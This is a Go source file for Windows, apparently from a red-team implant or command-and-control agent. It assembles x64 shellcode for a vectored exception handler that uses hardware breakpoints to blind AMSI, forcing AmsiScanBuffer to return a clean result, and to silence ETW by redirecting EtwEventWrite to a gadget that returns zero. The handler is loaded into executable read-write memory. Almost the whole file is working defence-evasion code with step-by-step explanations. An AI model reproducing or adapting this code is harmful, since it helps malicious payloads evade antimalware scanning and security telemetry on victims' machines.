//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"unsafe"
)

// buildNativeVEHHandler creates a native x64 machine code VEH handler that
// does NOT depend on the Go runtime, so it can safely execute on non-Go threads
// (e.g., CLR-created threads). This fixes the crash caused by syscall.NewCallback.
//
// The handler is allocated via VirtualAlloc with PAGE_EXECUTE_READWRITE.
// A separate data block (RW) stores the AMSI and ETW target addresses.
//
// Data block layout (24 bytes):
//
//	[0x00] uint64: AmsiScanBuffer address (0 = not set)
//	[0x08] uint64: EtwEventWrite address  (0 = not set)
//	[0x10] uint64: ETW gadget address ("xor eax,eax; ret")
//
// Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
//  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
//  2. Load ContextRecord pointer
//  3. Compare ContextRecord->Rip against AMSI addr:
//     - Simulate AmsiScanBuffer return directly in CONTEXT (no gadget):
//     * Read return addr from [context.Rsp], set context.Rip to it
//     * Read AMSI_RESULT* from [context.Rsp+0x30], write 0 (CLEAN) to *result
//     * Set context.Rsp += 8 (pop return addr)
//     * Set context.Rax = 0 (S_OK)
//     - One-shot: disable Dr0 (clear Dr7 bit 0) after first interception per thread
//  4. Compare ContextRecord->Rip against ETW addr:
//     - Redirect Rip to "xor eax,eax; ret" gadget (returns 0/STATUS_SUCCESS)
//     - One-shot: disable Dr1 (clear Dr7 bit 2) — prevents Go runtime crashes
//  5. Clear Dr6, return EXCEPTION_CONTINUE_EXECUTION (-1)
//  6. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
//
// AMSI bypass details:
//
//	AmsiScanBuffer has 6 parameters. The 6th (AMSI_RESULT *result) is an output
//	parameter at [RSP+0x30] from the function's entry point. We simulate the
//	entire return by modifying the CONTEXT directly: set Rip to the return address,
//	adjust Rsp, write AMSI_RESULT_CLEAN to *result, and set Rax to S_OK.
//	This avoids executing any gadget on the CLR thread — Windows simply restores
//	the modified CONTEXT and execution continues at the caller.
//
// ETW one-shot rationale:
//
//	Go runtime threads call EtwEventWrite during GC/scheduling. Without one-shot,
//	the VEH handler fires repeatedly on Go runtime threads, causing crashes.
//	AMSI does NOT need one-shot because AmsiScanBuffer is only called explicitly
//	by the CLR, not by Go runtime internals.
func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
	dataPtr, _, callErr := procVirtualAlloc.Call(
		0,
		24,
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if dataPtr == 0 {
		return 0, 0, fmt.Errorf("allocate data block failed: %w", callErr)
	}

	// Write target addresses into data block
	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr, [0x10] = ETW gadget (filled later)
	dataSlice := (*[24]byte)(unsafe.Pointer(dataPtr))
	binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
	binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))

	// Build x64 shellcode for VEH handler.
	// Windows x64 ABI: first arg (EXCEPTION_POINTERS*) is in RCX.
	//
	// EXCEPTION_POINTERS layout:
	//   [+0x00] EXCEPTION_RECORD* ExceptionRecord
	//   [+0x08] CONTEXT*          ContextRecord
	//
	// EXCEPTION_RECORD layout:
	//   [+0x00] DWORD ExceptionCode
	//
	// CONTEXT_AMD64 offsets:
	//   Dr6  = 0x68
	//   Dr7  = 0x70
	//   Rax  = 0x78
	//   Rsp  = 0x98
	//   Rip  = 0xF8
	//
	var code []byte

	// Function prologue — save non-volatile registers we use
	code = append(code, 0x55)             // push rbp
	code = append(code, 0x48, 0x89, 0xE5) // mov rbp, rsp
	code = append(code, 0x53)             // push rbx
	code = append(code, 0x41, 0x54)       // push r12
	code = append(code, 0x41, 0x55)       // push r13

	// Load ExceptionRecord pointer: rax = [rcx+0x00]
	code = append(code, 0x48, 0x8B, 0x01) // mov rax, [rcx]

	// Check ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
	// cmp dword [rax], 0x80000004
	code = append(code, 0x81, 0x38, 0x04, 0x00, 0x00, 0x80) // cmp dword [rax], 0x80000004

	// jne not_ours
	code = append(code, 0x0F, 0x85) // jne rel32 (patched below)
	jneNotOursOffset := len(code)
	code = append(code, 0x00, 0x00, 0x00, 0x00) // placeholder

	// Load ContextRecord pointer: rbx = [rcx+0x08]
	code = append(code, 0x48, 0x8B, 0x59, 0x08) // mov rbx, [rcx+0x08]

	// Load Rip from context: r12 = [rbx+0xF8]
	code = append(code, 0x4C, 0x8B, 0xA3) // mov r12, [rbx+0xF8]
	code = append(code, 0xF8, 0x00, 0x00, 0x00)

	// Load data block address into r13
	// movabs r13, <dataPtr>
	code = append(code, 0x49, 0xBD) // movabs r13, imm64
	dataPtrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(dataPtrBytes, uint64(dataPtr))
	code = append(code, dataPtrBytes...)

	code, jzSkipAmsiOff, jneSkipAmsiOff := vehBuildAMSIPath(code)
	skipAmsiTarget := len(code)
	code[jzSkipAmsiOff] = byte(skipAmsiTarget - jzSkipAmsiOff - 1)
	code[jneSkipAmsiOff] = byte(skipAmsiTarget - jneSkipAmsiOff - 1)

	code, jzNotOursShortOff, jneNotOursShortOff := vehBuildETWPath(code)
	notOursShortTarget := len(code)
	code[jzNotOursShortOff] = byte(notOursShortTarget - jzNotOursShortOff - 1)
	code[jneNotOursShortOff] = byte(notOursShortTarget - jneNotOursShortOff - 1)

	// not_ours:
	notOursTarget := len(code)
	// Patch the jne rel32 from the ExceptionCode check
	rel32 := int32(notOursTarget - (jneNotOursOffset + 4))
	binary.LittleEndian.PutUint32(code[jneNotOursOffset:jneNotOursOffset+4], uint32(rel32))

	// Return EXCEPTION_CONTINUE_SEARCH (0)
	code = append(code, 0x31, 0xC0) // xor eax, eax

	// Epilogue
	code = append(code, 0x41, 0x5D) // pop r13
	code = append(code, 0x41, 0x5C) // pop r12
	code = append(code, 0x5B)       // pop rbx
	code = append(code, 0x5D)       // pop rbp
	code = append(code, 0xC3)       // ret

	// ETW gadget: simple "xor eax, eax; ret" (returns 0/STATUS_SUCCESS)
	etwGadgetOffset := len(code)
	code = append(code, 0x31, 0xC0) // xor eax, eax
	code = append(code, 0xC3)       // ret

	// Allocate executable memory and copy shellcode + gadgets
	codeSize := uintptr(len(code))
	codePtr, _, callErr := procVirtualAlloc.Call(
		0,
		codeSize,
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if codePtr == 0 {
		return 0, 0, fmt.Errorf("allocate handler code failed: %w", callErr)
	}

	// Copy shellcode to executable memory
	codeSlice := unsafe.Slice((*byte)(unsafe.Pointer(codePtr)), len(code))
	copy(codeSlice, code)

	// Store ETW gadget address in data block at offset 0x10
	etwGadgetAddr := codePtr + uintptr(etwGadgetOffset)
	binary.LittleEndian.PutUint64(dataSlice[16:24], uint64(etwGadgetAddr))

	return codePtr, dataPtr, nil
}

func vehAppendContinueExecution(code []byte) []byte {
	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
	code = append(code, 0x41, 0x5D)                   // pop r13
	code = append(code, 0x41, 0x5C)                   // pop r12
	code = append(code, 0x5B)                         // pop rbx
	code = append(code, 0x5D)                         // pop rbp
	code = append(code, 0xC3)                         // ret
	return code
}

// vehBuildAMSIPath appends the AMSI VEH handler bytecode. Returns the updated
// code slice and the two jump-offset positions (jz and jne to skip_amsi) that
// the caller must patch once the skip target address is known.
func vehBuildAMSIPath(code []byte) ([]byte, int, int) {
	// Load amsiAddr from data block: rax = [r13+0x00]
	code = append(code, 0x49, 0x8B, 0x45, 0x00) // mov rax, [r13+0x00]
	code = append(code, 0x48, 0x85, 0xC0)       // test rax, rax
	code = append(code, 0x74)                   // jz skip_amsi (rel8)
	jzOff := len(code)
	code = append(code, 0x00)

	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
	code = append(code, 0x75)             // jne skip_amsi (rel8)
	jneOff := len(code)
	code = append(code, 0x00)

	// Simulate AmsiScanBuffer return via CONTEXT manipulation.
	// Load context.Rsp
	code = append(code, 0x48, 0x8B, 0x83, 0x98, 0x00, 0x00, 0x00) // mov rax, [rbx+0x98]
	// Read return address
	code = append(code, 0x48, 0x8B, 0x08) // mov rcx, [rax]
	// Set context.Rip = return address
	code = append(code, 0x48, 0x89, 0x8B, 0xF8, 0x00, 0x00, 0x00) // mov [rbx+0xF8], rcx
	// Read AMSI_RESULT* (6th parameter at rsp+0x30)
	code = append(code, 0x48, 0x8B, 0x48, 0x30) // mov rcx, [rax+0x30]
	// Write AMSI_RESULT_CLEAN (0), guarded against NULL
	code = append(code, 0x48, 0x85, 0xC9)                   // test rcx, rcx
	code = append(code, 0x74, 0x06)                         // jz skip_write
	code = append(code, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00) // mov dword [rcx], 0
	// Adjust context.Rsp += 8
	code = append(code, 0x48, 0x83, 0xC0, 0x08)             // add rax, 8
	code = append(code, 0x48, 0x89, 0x83, 0x98, 0x00, 0x00, 0x00) // mov [rbx+0x98], rax
	// Set context.Rax = 0 (S_OK)
	code = append(code, 0x48, 0xC7, 0x83, 0x78, 0x00, 0x00, 0x00) // mov qword [rbx+0x78], 0
	code = append(code, 0x00, 0x00, 0x00, 0x00)

	// One-shot: clear Dr0 (bit 0 of Dr7), clear Dr6
	code = append(code, 0x48, 0x8B, 0x83, 0x70, 0x00, 0x00, 0x00) // mov rax, [rbx+0x70]
	code = append(code, 0x48, 0x83, 0xE0, 0xFE)                   // and rax, ~1
	code = append(code, 0x48, 0x89, 0x83, 0x70, 0x00, 0x00, 0x00) // mov [rbx+0x70], rax
	code = append(code, 0x48, 0xC7, 0x83, 0x68, 0x00, 0x00, 0x00) // mov qword [rbx+0x68], 0
	code = append(code, 0x00, 0x00, 0x00, 0x00)

	code = vehAppendContinueExecution(code)
	return code, jzOff, jneOff
}

// vehBuildETWPath appends the ETW VEH handler bytecode. Returns the updated
// code slice and two jump-offset positions for patching.
func vehBuildETWPath(code []byte) ([]byte, int, int) {
	// Load etwAddr from data block: rax = [r13+0x08]
	code = append(code, 0x49, 0x8B, 0x45, 0x08) // mov rax, [r13+0x08]
	code = append(code, 0x48, 0x85, 0xC0)       // test rax, rax
	code = append(code, 0x74)                   // jz not_ours_short (rel8)
	jzOff := len(code)
	code = append(code, 0x00)

	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
	code = append(code, 0x75)             // jne not_ours_short (rel8)
	jneOff := len(code)
	code = append(code, 0x00)

	// Redirect Rip to "xor eax,eax; ret" gadget
	code = append(code, 0x49, 0x8B, 0x45, 0x10)             // mov rax, [r13+0x10]
	code = append(code, 0x48, 0x89, 0x83, 0xF8, 0x00, 0x00, 0x00) // mov [rbx+0xF8], rax

	// One-shot: clear Dr1 (bit 2 of Dr7), clear Dr6
	code = append(code, 0x48, 0x8B, 0x83, 0x70, 0x00, 0x00, 0x00) // mov rax, [rbx+0x70]
	code = append(code, 0x48, 0x83, 0xE0, 0xFB)                   // and rax, ~4
	code = append(code, 0x48, 0x89, 0x83, 0x70, 0x00, 0x00, 0x00) // mov [rbx+0x70], rax
	code = append(code, 0x48, 0xC7, 0x83, 0x68, 0x00, 0x00, 0x00) // mov qword [rbx+0x68], 0
	code = append(code, 0x00, 0x00, 0x00, 0x00)

	code = vehAppendContinueExecution(code)
	return code, jzOff, jneOff
}
